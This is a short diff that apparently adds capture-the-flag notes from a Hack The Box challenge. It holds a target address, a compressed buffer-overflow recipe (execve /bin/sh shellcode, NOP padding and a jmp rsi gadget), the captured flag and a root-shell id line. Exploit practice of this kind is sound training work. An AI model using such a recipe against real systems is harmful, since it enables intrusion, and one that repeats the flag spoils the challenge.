@@ -1,0 +1,4 @@
+154.57.164.82:31272
+payload: execve("/bin//sh") + NOP pad to 256 + p64(0x401041 jmp rsi)
+flag: HTB{juMp1nG_w1tH_tH3_r3gIsT3rS?_828f9eeafefa8257fb4db8082624bca0}
+uid=0(root)
